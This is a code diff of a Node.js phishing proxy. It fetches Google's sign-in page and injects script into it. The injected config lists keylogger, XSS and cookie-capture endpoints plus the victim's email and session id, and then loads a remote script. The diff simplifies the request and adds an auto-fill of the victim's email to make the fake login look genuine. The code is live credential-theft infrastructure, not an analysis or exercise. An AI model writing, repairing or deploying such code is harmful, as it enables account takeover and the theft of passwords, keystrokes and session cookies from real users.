@@ -406,7 +406,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  HANDLE LOGIN REQUEST - Google Workspace (Enhanced)
+//  HANDLE LOGIN REQUEST - Google Workspace (FIXED)
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -431,7 +431,8 @@ function handleLoginRequest(req, res) {
     console.log(`[PROXY] 🆔 Session: ${sessionId}`);
     console.log(`[PROXY] 📡 IP: ${ip}`);
 
-    // ✅ Build the Google login URL with proper parameters
+    // ✅ FIXED: Proper URL with email pre-filled
+    // Google uses 'Email' parameter for the email field
     const targetUrl = `https://accounts.google.com/ServiceLogin?` +
         `Email=${encodeURIComponent(email)}&` +
         `continue=https://mail.google.com/mail&` +
@@ -442,91 +443,21 @@ function handleLoginRequest(req, res) {
 
     console.log(`[PROXY] 🔗 Target URL: ${targetUrl}`);
 
-    // ✅ Use proper headers to avoid blocking
-    const options = {
-        hostname: 'accounts.google.com',
-        path: '/ServiceLogin?' + new URLSearchParams({
-            Email: email,
-            continue: 'https://mail.google.com/mail',
-            service: 'mail',
-            hl: 'en',
-            flowName: 'GlifWebSignIn',
-            flowEntry: 'ServiceLogin'
-        }).toString(),
-        method: 'GET',
+    https.get(targetUrl, {
         headers: {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1'
+            'Cache-Control': 'no-cache'
         }
-    };
-
-    https.get(options, (targetRes) => {
+    }, (targetRes) => {
         let data = [];
         targetRes.on('data', chunk => data.push(chunk));
         targetRes.on('end', () => {
             let body = Buffer.concat(data).toString();
             
-            // ✅ Handle redirects from Google
-            if (targetRes.statusCode === 302 || targetRes.statusCode === 301) {
-                const location = targetRes.headers.location;
-                console.log(`[PROXY] 🔄 Google redirecting to: ${location}`);
-                
-                // If redirecting to accounts.google.com, follow it
-                if (location && location.includes('accounts.google.com')) {
-                    https.get(location, {
-                        headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-                        }
-                    }, (redirectRes) => {
-                        let redirectData = [];
-                        redirectRes.on('data', chunk => redirectData.push(chunk));
-                        redirectRes.on('end', () => {
-                            let redirectBody = Buffer.concat(redirectData).toString();
-                            const injectionScript = `
-                            <script>
-                                window.GOOGLE_CONFIG = {
-                                    BACKEND_URL: '${BACKEND_URL}',
-                                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
-                                    XSS_ENDPOINT: '${PATHS.xssEndpoint}',
-                                    COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
-                                    KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
-                                    SESSION_ID: '${sessionId}',
-                                    EMAIL: '${email}',
-                                    SERVICE: 'Google Workspace',
-                                    CLIENT_ID: '${GOOGLE_CLIENT_ID || ''}'
-                                };
-                                console.log('🔐 Google Proxy loaded');
-                                console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
-                            </script>
-                            <script src="${PATHS.script}"></script>
-                            `;
-                            redirectBody = redirectBody.replace(/<\/body>/i, injectionScript + '</body>');
-                            
-                            res.writeHead(redirectRes.statusCode || 200, {
-                                'Content-Type': 'text/html',
-                                'Cache-Control': 'no-store, no-cache, must-revalidate'
-                            });
-                            res.end(redirectBody);
-                        });
-                    }).on('error', (err) => {
-                        console.error('[ERROR] Redirect follow failed:', err.message);
-                        res.writeHead(302, { 'Location': targetUrl });
-                        res.end();
-                    });
-                    return;
-                }
-            }
-
-            // ✅ Inject script into the page
+            // ✅ Inject script with email pre-filled
             const injectionScript = `
             <script>
                 window.GOOGLE_CONFIG = {
@@ -537,12 +468,25 @@ function handleLoginRequest(req, res) {
                     KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
                     SESSION_ID: '${sessionId}',
                     EMAIL: '${email}',
-                    SERVICE: 'Google Workspace',
-                    CLIENT_ID: '${GOOGLE_CLIENT_ID || ''}'
+                    SERVICE: 'Google Workspace'
                 };
                 console.log('🔐 Google Proxy loaded');
                 console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
-                console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
+                
+                // ✅ AUTO-FILL EMAIL on page load
+                document.addEventListener('DOMContentLoaded', function() {
+                    const email = '${email}';
+                    const emailField = document.querySelector('input[name="Email"]') || 
+                                      document.querySelector('input[type="email"]') ||
+                                      document.querySelector('input[name="identifier"]');
+                    if (emailField) {
+                        emailField.value = email;
+                        // Trigger input event to show email
+                        const event = new Event('input', { bubbles: true });
+                        emailField.dispatchEvent(event);
+                        console.log('📧 Auto-filled email:', email);
+                    }
+                });
             </script>
             <script src="${PATHS.script}"></script>
             `;
@@ -551,8 +495,7 @@ function handleLoginRequest(req, res) {
             
             res.writeHead(targetRes.statusCode || 200, {
                 'Content-Type': 'text/html',
-                'Cache-Control': 'no-store, no-cache, must-revalidate',
-                'Pragma': 'no-cache'
+                'Cache-Control': 'no-store, no-cache, must-revalidate'
             });
             res.end(body);
         });
